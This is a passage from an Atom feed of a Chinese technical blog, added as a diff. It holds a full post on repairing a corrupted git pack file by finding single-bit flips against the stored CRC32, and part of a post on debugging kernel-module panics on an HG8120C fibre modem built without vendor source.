@@ -1,0 +1,1413 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <title>晓风残月</title>
+    <id>https://blog.leexiaolan.tk/</id>
+    <subtitle>风月无边</subtitle>
+    <link href="https://blog.leexiaolan.tk" />
+    <link href="https://blog.leexiaolan.tk/atom.xml" rel="self" />
+    <updated>2018-08-02T03:56:21Z</updated>
+    <author>
+      <name>LeeXiaolan</name>
+    </author>
+
+  <entry>
+      <link href="https://blog.leexiaolan.tk/fix-git-pack-file-corruption.html"/>
+      <id>https://blog.leexiaolan.tk/entry/fix-git-pack-file-corruption</id>
+      <title>修复损坏的 git pack 文件</title>
+      <content type="html"><![CDATA[
+      &lt;h1&gt;事由&lt;/h1&gt;
+&lt;p&gt;从朋友处得到一个 &lt;code&gt;git&lt;/code&gt; repo 的 &lt;code&gt;tgz&lt;/code&gt; 存档文件，解压之，然后使用 &lt;code&gt;git fsck&lt;/code&gt; 来校验存档的完整性，当看到输出 &lt;code&gt;error: ./objects/pack/pack-73ca*.pack SHA1 checksum mismatch&lt;/code&gt; 时，心想：&amp;ldquo;完蛋了，十几个 G 的文件损坏了，又得重来来过&amp;rdquo;。转念一想，有没有可能修复呢？&lt;/p&gt;
+&lt;h1&gt;声明&lt;/h1&gt;
+&lt;p&gt;本文中不涉及 &lt;code&gt;git pack&lt;/code&gt; 文件自身的任何修复信息，所有修复信息都来自外部信源。据我所知，&lt;code&gt;git pack&lt;/code&gt; 文件也不包含任何冗余信息可以用于自愈。&lt;/p&gt;
+&lt;p&gt;文中所有 &lt;code&gt;git object id&lt;/code&gt; 都经过编辑处理。&lt;/p&gt;
+&lt;h1&gt;意外的惊喜&lt;/h1&gt;
+&lt;p&gt;下面是 &lt;code&gt;git fsck&lt;/code&gt; 完整的输出结果。乍一看，很多行错误，研判之后发现其实只有三五个 &lt;code&gt;object&lt;/code&gt; 损坏。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;leexiaolan@cherry:~/corrupted.git$ git fsck
+Checking object directories: 100% (256/256), done.
+error: ./objects/pack/pack-73ca*.pack SHA1 checksum mismatch
+error: index CRC mismatch for object 600f* from ./objects/pack/pack-73ca*.pack at offset 705539900
+error: inflate: data stream error (incorrect data check)
+error: cannot unpack 600f* from ./objects/pack/pack-73ca*.pack at offset 705539900
+error: index CRC mismatch for object c7cd* from ./objects/pack/pack-73ca*.pack at offset 3409251380
+error: inflate: data stream error (incorrect data check)
+error: cannot unpack c7cd* from ./objects/pack/pack-73ca*.pack at offset 3409251380
+error: inflate: data stream error (incorrect data check)
+error: failed to read delta base object c7cd* at offset 3409251380 from ./objects/pack/pack-73ca*.pack
+error: cannot unpack b7d6* from ./objects/pack/pack-73ca*.pack at offset 3435711445
+error: index CRC mismatch for object c0b6* from ./objects/pack/pack-73ca*.pack at offset 6495930501
+error: inflate: data stream error (incorrect data check)
+error: failed to unpack compressed delta at offset 6495930510 from ./objects/pack/pack-73ca*.pack
+error: cannot unpack c0b6* from ./objects/pack/pack-73ca*.pack at offset 6495930501
+error: inflate: data stream error (incorrect data check)
+error: failed to unpack compressed delta at offset 6495930510 from ./objects/pack/pack-73ca*.pack
+error: failed to read delta base object c0b6* at offset 6495930501 from ./objects/pack/pack-73ca*.pack
+error: cannot unpack 3efb* from ./objects/pack/pack-73ca*.pack at offset 6506530415
+error: inflate: data stream error (incorrect data check)
+error: failed to unpack compressed delta at offset 6495930510 from ./objects/pack/pack-73ca*.pack
+error: failed to read delta base object c0b6* at offset 6495930501 from ./objects/pack/pack-73ca*.pack
+error: cannot unpack 9db7* from ./objects/pack/pack-73ca*.pack at offset 6684278448
+error: index CRC mismatch for object 3b53* from ./objects/pack/pack-73ca*.pack at offset 15644018296
+error: inflate: data stream error (incorrect data check)
+error: cannot unpack 3b53* from ./objects/pack/pack-73ca*.pack at offset 15644018296
+Checking objects: 100% (7812/7812), done.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在对 &lt;code&gt;git fsck&lt;/code&gt; 的结果失望过后，回想起解压过程中，有看到 &lt;code&gt;tmp_pack_*&lt;/code&gt; 之类的文件。很多程序在处理文件时都是先用临时文件来保存中间结果，等所有写操作都完成之后，再将临时文件重命名为期望的文件名，&lt;code&gt;git&lt;/code&gt; 对 &lt;code&gt;pack&lt;/code&gt; 文件的操作也如此。如果残留的 &lt;code&gt;tmp_pack_*&lt;/code&gt; 临时文件和损坏的 &lt;code&gt;pack-73ca*.pack&lt;/code&gt; 文件相关的话，&lt;code&gt;tmp_pack_*&lt;/code&gt; 的内容应该就是 &lt;code&gt;pack-73ca*.pack&lt;/code&gt; 的前半部分。所以，上述 &lt;code&gt;git fsck&lt;/code&gt; 报告中损坏的 &lt;code&gt;object&lt;/code&gt; 在文件中的位置 &lt;code&gt;offset&lt;/code&gt;，如果小于 &lt;code&gt;tmp_pack_*&lt;/code&gt; 文件长度，则很可能 &lt;code&gt;tmp_pack_*&lt;/code&gt; 中包含了损坏 &lt;code&gt;object&lt;/code&gt; 的正确内容，继而得以从 &lt;code&gt;tmp_pack_*&lt;/code&gt; 中恢复此 &lt;code&gt;object&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;那到底 &lt;code&gt;tmp_pack_*&lt;/code&gt; 和 &lt;code&gt;pack-73ca*.pack&lt;/code&gt; 是否相关呢？那就来比较一下两文件的内容。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;leexiaolan@cherry:~/corrupted.git/objects/pack$ cmp -lb pack-73ca*.pack tmp_pack_h3N0ZY
+cmp: EOF on tmp_pack_h3N0ZY
+ 709450211 175 }    135 ]
+3157919099   7 ^G    47 &#39;
+3417553763 266 M-6  226 M-^V
+6501742392  55 -     15 ^M
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;tmp_pack_*&lt;/code&gt; 文件长度大于 7G，和 &lt;code&gt;pack-73ca*.pack&lt;/code&gt; 只存在 4 个字节的差异，很明显是相关的。再对比 &lt;code&gt;git fsck&lt;/code&gt; 的输出，除了偏移 &lt;code&gt;3157919098&lt;/code&gt; （&lt;code&gt;cmp&lt;/code&gt; 输出为从 &lt;code&gt;1&lt;/code&gt; 开始的计数，非 &lt;code&gt;0&lt;/code&gt; 开始的偏移）之外，其它三处附近均有 &lt;code&gt;object&lt;/code&gt; 损坏，故将这三处用 &lt;code&gt;tmp_pack_*&lt;/code&gt; 的数据去恢复 &lt;code&gt;pack-73ca*.pack&lt;/code&gt; 中对应数据。对恢复之后的结果执行 &lt;code&gt;git fsck&lt;/code&gt;，看看有什么变化。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;leexiaolan@cherry:~/corrupted.git/objects/pack$ T=709450210; dd if=tmp_pack_h3N0ZY \
+  of=pack-73ca*.pack bs=1 count=1 skip=$T seek=$T conv=notrunc
+1+0 records in
+1+0 records out
+1 byte copied, 0.0396145 s, 0.0 kB/s
+leexiaolan@cherry:~/corrupted.git/objects/pack$ T=3417553762; dd if=tmp_pack_h3N0ZY \
+  of=pack-73ca*.pack bs=1 count=1 skip=$T seek=$T conv=notrunc
+1+0 records in
+1+0 records out
+1 byte copied, 0.0237443 s, 0.0 kB/s
+leexiaolan@cherry:~/corrupted.git/objects/pack$ T=6501742391; dd if=tmp_pack_h3N0ZY \
+  of=pack-73ca*.pack bs=1 count=1 skip=$T seek=$T conv=notrunc
+1+0 records in
+1+0 records out
+1 byte copied, 0.0455239 s, 0.0 kB/s
+leexiaolan@cherry:~/corrupted.git$ git fsck
+Checking object directories: 100% (256/256), done.
+error: ./objects/pack/pack-73ca*.pack SHA1 checksum mismatch
+error: index CRC mismatch for object 3b53* from ./objects/pack/pack-73ca*.pack at offset 15644018296
+error: inflate: data stream error (incorrect data check)
+error: cannot unpack 3b53* from ./objects/pack/pack-73ca*.pack at offset 15644018296
+Checking objects: 100% (7812/7812), done.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Hooray! &lt;code&gt;git fsck&lt;/code&gt; 报告只有一个 &lt;code&gt;object&lt;/code&gt; 损坏了，但这个 &lt;code&gt;object&lt;/code&gt; 位于偏移 &lt;code&gt;15644018296&lt;/code&gt;，大于 &lt;code&gt;tmp_pack_*&lt;/code&gt; 文件大小，&lt;code&gt;tmp_pack_*&lt;/code&gt; 已经无能为力了。&lt;/p&gt;
+&lt;h1&gt;反观字节损坏模式&lt;/h1&gt;
+&lt;p&gt;上面 &lt;code&gt;cmp&lt;/code&gt; 输出中报告有 4 个字节差异，其中我们已经恢复到 &lt;code&gt;pack-73ca*.pack&lt;/code&gt; 文件的有三处，而且 &lt;code&gt;git fsck&lt;/code&gt; 的结果也说明这三处 &lt;code&gt;tmp_pack_*&lt;/code&gt; 中保存的是正确值，相反，被故意忽略的那个字节，保存在 &lt;code&gt;pack-73ca*.pack&lt;/code&gt; 中的值才是正确的，对应 &lt;code&gt;tmp_pack_*&lt;/code&gt; 中的值是损坏的。总结下来，损坏数据如下（&lt;code&gt;cmp&lt;/code&gt; 输出为八进制）。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;corrupted    correct
+     0175    0135
+      047      07
+     0266    0226
+      055     015
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;很明显，&lt;code&gt;corrupted - correct == 040&lt;/code&gt;， 损坏的数据都是每个字节的第五个 &lt;code&gt;bit&lt;/code&gt; 意外置 &lt;code&gt;1&lt;/code&gt;。如果我们对偏移 &lt;code&gt;15644018296&lt;/code&gt; 损坏的 &lt;code&gt;object&lt;/code&gt; 做这样的假设：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;损坏的字节也是因为第五个 &lt;code&gt;bit&lt;/code&gt; 置位。&lt;/li&gt;
+&lt;li&gt;整个 &lt;code&gt;object&lt;/code&gt; 中，有且只有一个字节损坏。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;基于这样的假设，有没有可能通过穷举损坏的字节来恢复最后一个 &lt;code&gt;object&lt;/code&gt; 数据呢？&lt;/p&gt;
+&lt;h1&gt;穷举&lt;/h1&gt;
+&lt;p&gt;阅读 &lt;a title=&quot;show-index documentation&quot; href=&quot;https://github.com/git/git/blob/master/Documentation/git-show-index.txt&quot;&gt;git-show-index文档&lt;/a&gt; 得知，&lt;code&gt;pack-*.idx&lt;/code&gt; 中保存每个 &lt;code&gt;object&lt;/code&gt; 在 &lt;code&gt;pack&lt;/code&gt; 中的偏移和 &lt;code&gt;CRC32&lt;/code&gt;。同样假定这些保存在 &lt;code&gt;pack-*.idx&lt;/code&gt; 文件中的信息是正确的，因此穷举过程中，可以通过计算 &lt;code&gt;CRC32&lt;/code&gt; 来验证合法性。通过源代码 &lt;a href=&quot;https://github.com/git/git/blob/b7bd9486b055c3f967a870311e704e3bb0654e4f/builtin/pack-objects.c#L847&quot;&gt;pack-objects.c&lt;/a&gt; 得知，&lt;code&gt;pack&lt;/code&gt; 文件中相邻 &lt;code&gt;object&lt;/code&gt; 之间是没有任何其它数据或 &lt;code&gt;padding&lt;/code&gt; 的，因此可以通过前后两个 &lt;code&gt;object&lt;/code&gt; 的偏移之差来计算前面 &lt;code&gt;object&lt;/code&gt; 的大小。通过偏移和大小，已经可以获取到 &lt;code&gt;object&lt;/code&gt; 的数据了，虽然这个数据是损坏的。有了这些信息，便可以设计一个穷举过程来恢复数据了。&lt;/p&gt;
+&lt;p&gt;穷举过程大概是这样的：对于损坏数据中，每一个第五 &lt;code&gt;bit&lt;/code&gt; 被置位的字节，我们都尝试将其清零，然后计算 &lt;code&gt;CRC32&lt;/code&gt;，若清零后计算得到的 &lt;code&gt;CRC32&lt;/code&gt; 和 &lt;code&gt;pack-*.idx&lt;/code&gt; 文件中保存的值相同，则认为找到了损坏的字节。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;leexiaolan@cherry:~/corrupted.git/objects/pack$ git show-index&amp;lt;pack-*.idx|sort -n|grep \\b3b53 -A1
+15644018296 3b53* (3bbff14e)
+15651154929 eda3* (2e391a6d)
+# 损坏 `object` `3b53*` 大小为 15651154929-15644018296，
+# 偏移为 15644018296，CRC32 为 0x3bbff14e
+leexiaolan@cherry:~/corrupted.git/objects/pack$ cat corruption
+#!/usr/bin/env python2
+# Parameters: pack offset length expectedCrc [start [end]]
+
+import sys
+from zlib import crc32
+
+def main():
+  argv = list(sys.argv[1:])
+  pack = argv.pop(0)
+  offset = int(argv.pop(0), 0)
+  length = int(argv.pop(0), 0)
+  expectedCrc = int(argv.pop(0), 0) &amp;amp; 0xffffffff
+  start = int(argv.pop(0), 0) if argv else 0
+  end = int(argv.pop(0), 0) if argv else sys.maxint
+
+  with open(pack, &#39;rb&#39;) as fi:
+    fi.seek(offset)
+    d=fi.read(length)
+
+  prev = crc32(d[:start]) if 0 &amp;lt; start else 0
+  for i in range(start, min(end, len(d))):
+    if i % 4096 == 0: print &#39;trying&#39;, hex(i)
+    byte = ord(d[i])
+    if (byte &amp;amp; 0x20) != 0:
+      crc = crc32(d[i+1:], crc32(chr(byte &amp;amp; ~0x20), prev)) &amp;amp; 0xffffffff
+      if crc == expectedCrc:
+    print &#39;found fix at offset&#39;, hex(i), hex(byte), &#39;-&amp;gt;&#39;, hex(byte &amp;amp; ~0x20)
+    return 0
+
+    prev = crc32(d[i], prev)
+
+  print &#39;not found&#39;
+  return 1
+
+if &#39;__main__&#39; == __name__:
+  sys.exit(main())
+leexiaolan@cherry:~/corrupted.git/objects/pack$ ./corruption pack-*.pack \
+  15644018296 $((15651154929-15644018296)) 0x3bbff14e
+... # 几个小时后
+trying 0x1d0000
+trying 0x1d1000
+found fix at offset 0x1d1e81 0xa1 -&amp;gt; 0x81
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;验证&lt;/h1&gt;
+&lt;p&gt;前面穷举过程中找到的解，虽然通过了 &lt;code&gt;CRC32&lt;/code&gt; 的验证，但是不排除碰撞的可能，尽管概率比较小。如果修复后的 &lt;code&gt;pack&lt;/code&gt;，&lt;code&gt;git fsck&lt;/code&gt; 没有报告 &lt;code&gt;SHA1 checksum mismatch&lt;/code&gt;，因为两种不同方法的 &lt;code&gt;checksum&lt;/code&gt; 都同时碰撞的概率就非常小了，这样就有很高的置信度认为修复是成功的。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;leexiaolan@cherry:~/corrupted.git/objects/pack$ echo -en \\x81 | \
+  dd of=pack-73ca*.pack conv=notrunc bs=1 seek=$((15644018296+0x1d1e81))
+1+0 records in
+1+0 records out
+1 byte copied, 0.023496 s, 0.0 kB/s
+leexiaolan@cherry:~/corrupted.git$ git fsck
+Checking object directories: 100% (256/256), done.
+Checking objects: 100% (7812/7812), done.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&#39;git fsck` 没有报告任何错误，看起来上面所做假设都是对的，修复很成功。&lt;/p&gt;
+&lt;h1&gt;结论&lt;/h1&gt;
+&lt;p&gt;本文中涉及的文件损坏，不是因为网络传输导致的，网络传输的是 &lt;code&gt;tgz&lt;/code&gt; 存档。&lt;code&gt;tgz&lt;/code&gt; 存档文件本身已经做过 &lt;code&gt;md5sum&lt;/code&gt; 校验无误。损坏进入的时机应该是在 &lt;code&gt;tgz&lt;/code&gt; 存档文件创建之时。损坏字节的变化模式也很明显，都是第五个 &lt;code&gt;bit&lt;/code&gt; 意外置位，这个模式也是我们得以修复的关键所在。最后，损坏的 &lt;code&gt;git object&lt;/code&gt; 大小 7M+，穷举所耗费时间 python 代码大概 4，5 个小时（单 CPU 时间），基本可以接受。&lt;/p&gt;
+      
+                <p>本文网址:<a href="https://blog.leexiaolan.tk/fix-git-pack-file-corruption.html">https://blog.leexiaolan.tk/fix-git-pack-file-corruption.html</a></p>
+
+      ]]></content>
+      <author>
+          <name>李晓岚</name>
+      </author>
+      <updated>2018-08-02T03:56:21Z</updated>
+  </entry>
+
+  <entry>
+      <link href="https://blog.leexiaolan.tk/compile-kernel-module-for-hg8120c-without-source-and-config.html"/>
+      <id>https://blog.leexiaolan.tk/entry/compile-kernel-module-for-hg8120c-without-source-and-config</id>
+      <title>无 kernel 源代码和 config 的情况下为 HG8120C 编译内核模块</title>
+      <content type="html"><![CDATA[
+      &lt;p&gt;有读者在&lt;a href=&quot;/persist-root-shell-and-perfect-solution-for-ipv6-package-loss-on-hg8120c-ont.html#disqus_thread&quot; title=&quot;Tos&#39;s comment&quot;&gt;评论区&lt;/a&gt;留言说，想为光猫编译 ext2 文件系统内核模块，但是才执行 &lt;code&gt;insmod ext2.ko&lt;/code&gt; 插入编译好的模块就出现 kernel panic。这个问题其实很早之前在我为光猫编译 &lt;code&gt;aufs&lt;/code&gt; 模块就已经遇到了，下面就来说说如何解决这一问题。&lt;/p&gt;
+&lt;h1&gt;问题描述&lt;/h1&gt;
+&lt;p&gt;设备光猫 HG8120C 使用的 SOC 是 &lt;code&gt;Hisi sd511x&lt;/code&gt;，运行 &lt;code&gt;linux v2.6.34.10&lt;/code&gt; 内核，生产商不提供内核 GPL 源代码（至少我没有找到可以方便获取源代码的方式），因此缺失对应设备驱动，所以不能运行自行编译的内核。原厂内核不支持某些我们想要的特性，比如 &lt;code&gt;aufs&lt;/code&gt; 或 &lt;code&gt;ext2&lt;/code&gt; 等文件系统，我们能不能使用 &lt;code&gt;vanilla linux kernel&lt;/code&gt; 的源代码来编译这些模块，使得这些模块可以顺利运行在原厂内核中？&lt;/p&gt;
+&lt;p&gt;理论上，和设备硬件驱动无关的模块是可以通过这样的方式编译并运行的。但是呢，可能因为模块依赖的某些函数没有导出，或者是被编译优化掉了，又或者 &lt;code&gt;CONFIG_*&lt;/code&gt; 设置的原因，某些内核结构体少了一些字段，又或者厂商在内核中加入了私货，改变了结构体的布局或大小，等等等等，都可能导致使用这种方式编译的模块运行失败。厂商没有在 &lt;code&gt;/proc/config{,.gz}&lt;/code&gt; 留下配置，这进一步加大了问题的难度。基于之前 &lt;code&gt;aufs&lt;/code&gt; 的经验，我判断 &lt;code&gt;ext2&lt;/code&gt; 有 90% 的概率也是可以顺利运行起来的。&lt;/p&gt;
+&lt;h1&gt;编译 ext2.ko&lt;/h1&gt;
+&lt;p&gt;在之前编译 &lt;code&gt;aufs&lt;/code&gt; 的环境是，原始 &lt;a href=&quot;https://www.kernel.org/pub/linux/kernel/v2.6/longterm/v2.6.34/linux-2.6.34.10.tar.xz&quot; title=&quot;linux-2.6.34.10.tar.xz&quot;&gt;&lt;code&gt;linux v2.6.34.10&lt;/code&gt;&lt;/a&gt; 源代码，没有任何厂商夹带的私货，随便找了一个 &lt;code&gt;arm&lt;/code&gt; 架构支持 &lt;code&gt;SMP&lt;/code&gt; 板子的默认配置文件作为基础，编译 &lt;code&gt;aufs&lt;/code&gt; 模块，加载的目标系统测试运行，panic 后修正某些 &lt;code&gt;CONFIG_*&lt;/code&gt; 配置（后面将用 &lt;code&gt;loop.ko&lt;/code&gt; 做例子来示范如何定位错误根源），重复“编译-&amp;gt;测试-&amp;gt;panic后修正”这个过程，直到测试成功。&lt;/p&gt;
+&lt;p&gt;在这个环境中，编译 &lt;code&gt;ext2.ko&lt;/code&gt; 后，在目标设备上运行 &lt;code&gt;insmod ext2.ko&lt;/code&gt; 后，一切正常，看起来设备已经支持 &lt;code&gt;ext2fs&lt;/code&gt; 了。有这样的结果其实并不意外，因为在 &lt;code&gt;aufs&lt;/code&gt; 的环境中，我已经修正了一些与文件系统有关的配置和厂商对结构体布局的修改。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;WAP(Dopra Linux) # modinfo ext2.ko
+filename:       ext2.ko
+description:    Second Extended Filesystem
+author:         Remy Card and others
+license:        GPL
+vermagic:       2.6.34.10_sd5115v100_wr4.3 SMP mod_unload ARMv7
+WAP(Dopra Linux) # insmod ext2.ko
+WAP(Dopra Linux) # cat /proc/filesystems | grep ext2
+        ext2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;接下来就该测试挂载某个 &lt;code&gt;ext2&lt;/code&gt; 文件系统的设备了，当然第一就想到了 &lt;code&gt;loop&lt;/code&gt; 设备，但原厂内核不支持 &lt;code&gt;loop&lt;/code&gt; 设备。没关系，我们继续编译一个 &lt;code&gt;loop.ko&lt;/code&gt; 就行了。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;WAP(Dopra Linux) # insmod loop.ko
+# kernel panic and device rebooted.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;评论区那名读者遇到的类似问题出现啦！&lt;/p&gt;
+&lt;h1&gt;Debug loop.ko panic&lt;/h1&gt;
+&lt;p&gt;该如何 debug 这样的问题呢？幸运的是，厂商很“贴心”地为我们保存好了 panic 的很多信息，存放在 &lt;code&gt;/mnt/jffs2/panicinfo&lt;/code&gt; 路径的文件里。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# after boot up again.
+WAP(Dopra Linux) # cat /mnt/jffs2/panicinfo
+Kernel panic - not syncing: Fatal exception
+CPU: 0    Tainted: P      D W   (2.6.34.10_sd5115v100_wr4.3 #1)
+Process insmod (pid: 1793, stack limit = 0xc25a2270)
+PC is at c0092944
+LR is at c0092b3c
+pc : [&amp;lt;c0092944&amp;gt;]    lr : [&amp;lt;c0092b3c&amp;gt;]    psr: 60000013
+sp : c25a3edc  ip : 00000000  fp : 00000000
+r10: 4000ef74  r9 : c25a2000  r8 : bf898484
+r7 : bf898434  r6 : bf898484  r5 : 00000000  r4 : c387ba00
+r3 : 00000007  r2 : c035eac8  r1 : 00000000  r0 : 000000a0
+Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user
+[&amp;lt;bf0c2a6c&amp;gt;] (hw_ssp_get_backtrace_info+0x0/0x78 [hw_ssp_depend]) from [&amp;lt;bf0c2bd0&amp;gt;] (hw_ssp_write_panic_info+0xec/0x11c [hw_ssp_depend])
+[&amp;lt;bf0c2bd0&amp;gt;] (hw_ssp_write_panic_info+0xec/0x11c [hw_ssp_depend]) from [&amp;lt;c02e4368&amp;gt;] (panic+0xa0/0x124)
+[&amp;lt;c02e4368&amp;gt;] (panic+0xa0/0x124) from [&amp;lt;c0030c94&amp;gt;] (die+0x1b0/0x1d4)
+[&amp;lt;c0030c94&amp;gt;] (die+0x1b0/0x1d4) from [&amp;lt;c0033a2c&amp;gt;] (__do_kernel_fault+0x64/0x84)
+[&amp;lt;c0033a2c&amp;gt;] (__do_kernel_fault+0x64/0x84) from [&amp;lt;c0033e0c&amp;gt;] (do_page_fault+0x140/0x1e4)
+[&amp;lt;c0033e0c&amp;gt;] (do_page_fault+0x140/0x1e4) from [&amp;lt;c002c45c&amp;gt;] (do_DataAbort+0x34/0x98)
+[&amp;lt;c002c45c&amp;gt;] (do_DataAbort+0x34/0x98) from [&amp;lt;c002cbcc&amp;gt;] (__dabt_svc+0x4c/0x60)
+[&amp;lt;c002cbcc&amp;gt;] (__dabt_svc+0x4c/0x60) from [&amp;lt;c0092944&amp;gt;] (bdi_register+0x8/0x13c)
+[&amp;lt;c0092944&amp;gt;] (bdi_register+0x8/0x13c) from [&amp;lt;bf898484&amp;gt;] (0xbf898484)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;从上面的 panic 信息可以看出，导致 panic 的原因是 data abort（从 &lt;code&gt;do_DataAbort&lt;/code&gt; 可以猜想到），也就是通常的野指针问题。具体发生的位置在 &lt;code&gt;bdi_register&lt;/code&gt; 很靠前的位置（bdi_register+0x8），基本就是头一两行代码的样子。至于最后的 &lt;code&gt;from [&amp;lt;bf898484&amp;gt;]&lt;/code&gt; 这个值和寄存器 &lt;code&gt;LR&lt;/code&gt; 相去甚远，就可以选择不用相信了。&lt;/p&gt;
+&lt;p&gt;找到 &lt;code&gt;bdi_register&lt;/code&gt; 函数对应的源代码 &lt;a href=&quot;http://elixir.free-electrons.com/linux/v2.6.34.10/source/mm/backing-dev.c#L538&quot; title=&quot;mm/backing-dev.c#L538&quot;&gt;&lt;code&gt;mm/backing-dev&lt;/code&gt;&lt;/a&gt;，很容易确定是因为 545 行的 &lt;code&gt;bdi&lt;/code&gt; 导致野指针异常。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/* mm/backing-dev.c */
+538 int bdi_register(struct backing_dev_info *bdi, struct device *parent,
+539                 const char *fmt, ...)
+540 {
+541         va_list args;
+542         int ret = 0;
+543         struct device *dev;
+544
+545         if (bdi-&amp;gt;dev)   /* The driver needs to use separate queues per device */
+546                 goto exit;
+547
+548         va_start(args, fmt);
+            ...
+            ...
+            ...
+584         return ret;
+585 }
+586 EXPORT_SYMBOL(bdi_register);
+587
+588 int bdi_register_dev(struct backing_dev_info *bdi, dev_t dev)
+589 {
+590         return bdi_register(bdi, NULL, &quot;%u:%u&quot;, MAJOR(dev), MINOR(dev));
+591 }
+592 EXPORT_SYMBOL(bdi_register_dev);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;根据 &lt;code&gt;LR&lt;/code&gt; 寄存器，追溯到 &lt;code&gt;bdi_register&lt;/code&gt; 的调用者 &lt;code&gt;bdi_register_dev&lt;/code&gt;，这之后的完整调用栈就只能靠猜了，剩下唯一能确定的就是调用栈最终应该回溯到 &lt;code&gt;loop.ko&lt;/code&gt; 中的函数。&lt;/p&gt;
+&lt;p&gt;如果对内核相当熟悉，或者非常幸运（比如我），应该能很快梳理出完整的调用栈，如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;bdi_register
+bdi_register_dev
+add_disk
+loop_init_one
+loop_probe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;函数 &lt;code&gt;bdi_register&lt;/code&gt; 中引起的异常的 &lt;code&gt;bdi&lt;/code&gt; 参数值来源于 &lt;a href=&quot;http://elixir.free-electrons.com/linux/v2.6.34.10/source/block/genhd.c#L516&quot; title=&quot;block/genhd.c#L516&quot;&gt;&lt;code&gt;add_disk&lt;/code&gt;&lt;/a&gt;，549 行 &lt;code&gt;bdi = &amp;amp;disk-&amp;gt;queue-&amp;gt;backing_dev_info;&lt;/code&gt;。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/* block/genhd.c */
+516 void add_disk(struct gendisk *disk)
+517 {
+518         struct backing_dev_info *bdi;
+            ...
+            ...
+            ...
+546         register_disk(disk);
+547         blk_register_queue(disk);
+548
+549         bdi = &amp;amp;disk-&amp;gt;queue-&amp;gt;backing_dev_info;
+550         bdi_register_dev(bdi, disk_devt(disk));
+551         retval = sysfs_create_link(&amp;amp;disk_to_dev(disk)-&amp;gt;kobj, &amp;amp;bdi-&amp;gt;dev-&amp;gt;kobj,
+552                                    &quot;bdi&quot;);
+553         WARN_ON(retval);
+554 }
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;函数 &lt;code&gt;add_disk&lt;/code&gt; 是编译在内核中，可以通过查看其汇编代码来确定 &lt;code&gt;queue&lt;/code&gt; 和 &lt;code&gt;backing_dev_info&lt;/code&gt; 成员在结构体中的偏移量。&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&quot;原始内核中结构体成员的偏移量&quot; src=&quot;/media/ag5zfmJsb2ctbGVlLWhyZHISCxIFTWVkaWEYgICAgJmZjQoM/offset-in-add_disk-of-kernel.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;从上图高亮的汇编代码中可以看出，&lt;code&gt;queue&lt;/code&gt; 偏移量是 &lt;code&gt;0x11c&lt;/code&gt;，&lt;code&gt;backing_dev_info&lt;/code&gt; 的偏移量是 &lt;code&gt;0xa0&lt;/code&gt;。这是在原始厂商的内核中的偏移值。再来看看我们编译的 &lt;code&gt;loop.ko&lt;/code&gt; 中的偏移值。由于是我们自行编译的，获取这些信息相对比较容易。只需要在编译时配置 &lt;code&gt;CONFIG_DEBUG_INFO=y&lt;/code&gt; 后，使用 &lt;code&gt;pahole&lt;/code&gt; 就能获取这些信息。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;leexiaolan@mars:~/linux-2.6.34.10$ pahole -C gendisk drivers/block/loop.ko
+struct gendisk {
+        int                        major;                /*     0     4 */
+        int                        first_minor;          /*     4     4 */
+        int                        minors;               /*     8     4 */
+        char                       disk_name[32];        /*    12    32 */
+        char *                     (*devnode)(struct gendisk *, mode_t *); /*    44     4 */
+        struct disk_part_tbl *     part_tbl;             /*    48     4 */
+
+        /* XXX 4 bytes hole, try to pack */
+
+        struct hd_struct           part0;                /*    56   336 */
+        /* --- cacheline 6 boundary (384 bytes) was 8 bytes ago --- */
+        const struct block_device_operations  * fops;    /*   392     4 */
+        struct request_queue *     queue;                /*   396     4 */
+        ...
+        ...
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;queue&lt;/code&gt; 成员偏移量是 &lt;code&gt;396&lt;/code&gt;，转换成 16 进制是 &lt;code&gt;0x18c&lt;/code&gt;，和原始内核中的偏移量 &lt;code&gt;0x11c&lt;/code&gt; 多了 &lt;code&gt;0x70&lt;/code&gt;，所以位于 &lt;code&gt;queue&lt;/code&gt; 前面的大小为 &lt;code&gt;336&lt;/code&gt; 的 &lt;code&gt;part0&lt;/code&gt; 就很可疑了。继续深挖 &lt;code&gt;struct hd_struct part0&lt;/code&gt;。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;leexiaolan@mars:~/linux-2.6.34.10$ pahole -C hd_struct drivers/block/loop.ko
+struct hd_struct {
+        sector_t                   start_sect;           /*     0     4 */
+        sector_t                   nr_sects;             /*     4     4 */
+        sector_t                   alignment_offset;     /*     8     4 */
+        unsigned int               discard_alignment;    /*    12     4 */
+        struct device              __dev;                /*    16   280 */
+        /* --- cacheline 4 boundary (256 bytes) was 40 bytes ago --- */
+        struct kobject *           holder_dir;           /*   296     4 */
